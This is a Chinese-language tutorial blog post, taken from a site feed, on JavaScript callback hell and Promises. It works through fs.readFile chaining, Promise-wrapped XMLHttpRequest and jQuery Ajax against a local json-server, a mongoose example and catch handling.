title="为什么会有回调地狱"></a>为什么会有回调地狱</h2><p>回调地狱的原因是，当人们试图以一种从上到下的视觉方式执行JavaScript的方式编写JavaScript时。期望第1行发生的任何事情都会在第2行的代码开始运行之前完成，但是，在JavaScript上，有时候这并没办法进行，比如，在你通过异步读取文件时，也就是用fs模块读取多个文件时</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line">fs.readFile(<span class="string">'./a.txt'</span>, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">fs.readFile(<span class="string">'./b.txt'</span>, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">fs.readFile(<span class="string">'./c.txt'</span>, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>执行多次后，你会发现，有那么几次，也有可能好几次，看人品吧反正是，它是没有规则的读出来的（往往可能你的文件越大，读出来的时间会更久），也就是说，它并不会按照代码书写顺序去执行，这便是异步编程（如果试了没有，那就一直试，反正总会有的）。异步API导致了代码并不是按顺序执行的（可以读读这篇文章 <a href="https://www.jianshu.com/p/39adf6ab8ad1" target="_blank" rel="noopener">https://www.jianshu.com/p/39adf6ab8ad1</a> ——然后嘞，就会有上面那种解决方法，但是你会发现，代码非常的丑（别人是这样说的，反正我不是太这么认为，甚至觉得有点好看），还有非常难维护（这点认同）。所以就出现了几种解决方法 —Promise</p><h1 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>Promise：承诺，保证</li><li>Promise本身不是异步的，但往往都是内部封装一个异步任务</li></ul><p>丢出一张图形容Promise函数，相当于一个容器（下图源于所学教程，pending（悬而未决的））</p><img src= "/img/loading.gif" data-src="/2020/07/20/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/image-20200527213850773.png" alt="image-20200527213850773" style="zoom: 200%;"><p>代码如下，较易维护</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//resolved(解决（成功）)，rejected（驳回（失败））</span></span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolved, rejected</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//文件编码！！！！！！</span></span><br><span class="line">    fs.readFile(<span class="string">'./a.txt'</span>, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            rejected(err)</span><br><span class="line">        &#125;</span><br><span class="line">        resolved(data)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolved, rejected</span>) </span>&#123;</span><br><span class="line">    fs.readFile(<span class="string">'./b.txt'</span>, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            rejected(err)</span><br><span class="line">        &#125;</span><br><span class="line">        resolved(data)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p3 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolved, rejected</span>) </span>&#123;</span><br><span class="line">    fs.readFile(<span class="string">'c.txt'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            rejected(err)</span><br><span class="line">        &#125;</span><br><span class="line">        resolved(data)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//链式编程，🔺Promise会默认将then中return的值实例成一个promise对象，所以可以调用then方法，实现链式调用</span></span><br><span class="line">p1</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    &#125;)</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">        <span class="keyword">return</span> p3</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>then函数（ES6）说明：</p><p><img src= "/img/loading.gif" data-src="/2020/07/20/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/promise.png" alt="image-20200527214049975"></p><p>封装Promise中的<code>readFile</code>方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pReadFile = <span class="function"><span class="keyword">function</span>(<span class="params">filepath</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolved, rejected</span>) </span>&#123;</span><br><span class="line">        <span class="comment">//文件编码！！！！！！</span></span><br><span class="line">        fs.readFile(filepath, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                rejected(err)</span><br><span class="line">            &#125;</span><br><span class="line">            resolved(data)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pReadFile(<span class="string">"a.txt"</span>)</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">        <span class="keyword">return</span> pReadFile(<span class="string">"b.txt"</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">        <span class="keyword">return</span> pReadFile(<span class="string">"c.txt"</span>)</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(data)</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h1 id="Promise应用场景"><a href="#Promise应用场景" class="headerlink" title="Promise应用场景"></a>Promise应用场景</h1><h2 id="解决客户端回调嵌套问题"><a href="#解决客户端回调嵌套问题" class="headerlink" title="解决客户端回调嵌套问题"></a>解决客户端回调嵌套问题</h2><p>当出现类似于表关联的数据时，这时候就会遇到嵌套问题，当嵌套的数据只有一两个个还好，如果出现三四个甚至五六个，这时候就会出现回调地狱的问题，这里使用promise解决</p><h3 id="所需知识："><a href="#所需知识：" class="headerlink" title="所需知识："></a>所需知识：</h3><ol><li>npm模块：json-server、http-server</li><li>客户端模板引擎art-template</li><li>Ajax</li><li>jquery</li></ol><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li><p>安装json-server和http-server以及其他必要模块</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm i <span class="literal">-g</span> http<span class="literal">-server</span></span><br><span class="line">npm i <span class="literal">-g</span> json<span class="literal">-server</span></span><br><span class="line">npm i jquery -<span class="literal">-save</span></span><br><span class="line">npm i template -<span class="literal">-save</span></span><br></pre></td></tr></table></figure></li><li><p>建立html页面</p></li><li><p>设计表单，人员信息与工作职业相关联，搭配模板字符串使用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"user_form"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/template"</span> <span class="attr">id</span>=<span class="string">"tpl"</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">""</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; user.username &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">""</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; user.age &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">""</span>&gt;</span>职业<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">""</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        </span><span class="template-variable">&#123;&#123; <span class="builtin-name">each</span> jobs &#125;&#125;</span><span class="xml"> </span><span class="template-variable">&#123;&#123; <span class="builtin-name">if</span> user.job === $value.id &#125;&#125;</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; $value.id &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">selected</span>&gt;</span></span><span class="template-variable">&#123;&#123; $value.name &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        </span><span class="template-variable">&#123;&#123; <span class="builtin-name">else</span> &#125;&#125;</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"</span></span></span><span class="template-variable">&#123;&#123; $value.id &#125;&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span><span class="template-variable">&#123;&#123; $value.name &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        </span><span class="template-variable">&#123;&#123; /<span class="builtin-name">if</span> &#125;&#125;</span><span class="xml"> </span><span class="template-variable">&#123;&#123; /<span class="builtin-name">each</span> &#125;&#125;</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>引用相关模板字符串以及JQuery模块</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"node_modules/art-template/lib/template-web.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"node_modules/jquery/dist/jquery.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>书写Ajax向服务器发起请求,并封装便于使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url, callback</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> oReq = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">      oReq.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">oReq.responseText</span><br><span class="line">        callback(oReq.responseText)</span><br><span class="line">      &#125;</span><br><span class="line">      oReq.open(<span class="string">"get"</span>, url, <span class="literal">true</span>)</span><br><span class="line">      oReq.send()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>开启json-server服务，使用data.json文件（6、7步使用cmd）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json<span class="literal">-server</span> data.json</span><br></pre></td></tr></table></figure></li><li><p>将当前文件所处文件夹开放为服务器</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="literal">-server</span></span><br></pre></td></tr></table></figure><ul><li>若要禁用缓存，则使用以下命令</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="literal">-server</span> <span class="literal">-c</span><span class="literal">-1</span></span><br></pre></td></tr></table></figure></li><li><p>🔺请求代码</p><ol><li><p>若采用回调地狱类型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">get</span>("http://127.0.0.1:3000/users/1",function(userData)&#123;</span><br><span class="line">  <span class="keyword">get</span>("http://127.0.0.1:3000/jobs",function(jobsData)&#123;</span><br><span class="line">  <span class="keyword">var</span> htmlStr = template(<span class="string">"tpl"</span>, &#123;</span><br><span class="line">  user: <span class="built_in">JSON</span>.parse(userData),</span><br><span class="line">  jobs: <span class="built_in">JSON</span>.parse(jobsData)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="built_in">console</span>.log(htmlStr)</span><br><span class="line">  <span class="built_in">document</span>.querySelector(<span class="string">"#user_form"</span>).innerHTML = htmlStr</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>使用Jquery版的Promise</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Jquery的Ajax自带promise</span></span><br><span class="line"><span class="keyword">var</span> data = &#123;&#125;</span><br><span class="line">$.<span class="keyword">get</span>("http://127.0.0.1:3000/users/2")</span><br><span class="line"> .then(function(user)&#123;</span><br><span class="line">   data.user = user</span><br><span class="line">   <span class="keyword">return</span> $.<span class="keyword">get</span>("http://127.0.0.1:3000/jobs")</span><br><span class="line"> &#125;)</span><br><span class="line"> .then(function(jobs)&#123;</span><br><span class="line">   data.jobs = jobs</span><br><span class="line">   <span class="comment">// console.log(data)</span></span><br><span class="line">   <span class="keyword">var</span> str = template(<span class="string">"tpl"</span>,&#123;</span><br><span class="line">      user: data.user,</span><br><span class="line">      jobs: data.jobs</span><br><span class="line">    &#125;)</span><br><span class="line">   <span class="built_in">document</span>.querySelector(<span class="string">'#user_form'</span>).innerHTML = str</span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure></li><li><p>封装Promise版本的AJAX方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Rget</span>(<span class="params">url,callback</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve,reject</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">  <span class="comment">// 当请求加载成功之后要调用指定的函数</span></span><br><span class="line">  xhr.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 我现在需要得到这里的 xhr.responseText</span></span><br><span class="line">    resolve(<span class="built_in">JSON</span>.parse(xhr.responseText))</span><br><span class="line">    callback &amp;&amp; callback(<span class="built_in">JSON</span>.parse(xhr.responseText))</span><br><span class="line">  &#125;</span><br><span class="line">  xhr.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">err</span>)</span>&#123;</span><br><span class="line">    reject(err)</span><br><span class="line">  &#125;</span><br><span class="line">  xhr.open(<span class="string">"get"</span>, url, <span class="literal">true</span>)</span><br><span class="line">  xhr.send()</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;&#125;</span><br><span class="line">Rget(<span class="string">"http://127.0.0.1:3000/users/2"</span>)</span><br><span class="line"> .then(<span class="function"><span class="keyword">function</span>(<span class="params">user</span>)</span>&#123;</span><br><span class="line">    data.user = user</span><br><span class="line">    <span class="keyword">return</span> Rget(<span class="string">"http://127.0.0.1:3000/jobs"</span>)</span><br><span class="line"> &#125;)</span><br><span class="line"> .then(<span class="function"><span class="keyword">function</span>(<span class="params">jobs</span>)</span>&#123;</span><br><span class="line">    data.jobs = jobs</span><br><span class="line">    <span class="keyword">var</span> str = template(<span class="string">"tpl"</span>, &#123;</span><br><span class="line">      user: data.user,</span><br><span class="line">      jobs: data.jobs</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">document</span>.querySelector(<span class="string">"#user_form"</span>).innerHTML = str</span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure></li></ul></li></ol></li></ol><h2 id="Promise操作数据库"><a href="#Promise操作数据库" class="headerlink" title="Promise操作数据库"></a>Promise操作数据库</h2><ul><li>mongoose中所有的API都支持promise</li></ul><p>🔺根据查询是否已存在该记录从而决定是否创建新记录</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Cat.findOne(&#123; <span class="attr">name</span>: <span class="string">"好啊"</span> &#125;)</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span>(<span class="params">cat</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(cat)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'该cat已存在'</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Cat(&#123;<span class="string">"name"</span> : <span class="string">"好啊"</span>, <span class="string">"age"</span> : <span class="number">16</span> &#125;).save()</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><ol><li>每次改完js或html文件后在浏览器需刷新多次</li><li>每次改完json文件后需要重新启动json-server服务</li></ol><h2 id="catch异常处理"><a href="#catch异常处理" class="headerlink" title="catch异常处理"></a>catch异常处理</h2><p>在全部then之后添加<code>.catch(err =&gt; {})</code>即可对任何一个then处理过程抛出的异常进行捕获并中止代码继续执行</p><p>例如：读取文件并进行后续相关操作，若处理过程发生一个错误则传递给catch，则catch前面，出错误的then后面所有的then就不再执行</p><p>这里要注意区分，如果是在<code>then</code>中自行处理<code>err</code>，则代码还是会继续往下执行，这是和<code>catch</code>不同的点</p><p>还有如果在catch后面继续then，则还是会继续执行下去</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">readFile(<span class="string">'a.txt'</span>, <span class="string">'utf8'</span>)</span><br><span class="line">  .then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">    <span class="keyword">return</span> readFile(<span class="string">'a.txt'</span>, <span class="string">'utf8'</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(data)</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> Node.js </tag>
            
            <tag> 异步编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AJAX笔记</title>
      <link href="/2020/07/20/AJAX/"/>
      <url>/2020/07/20/AJAX/</url>
      
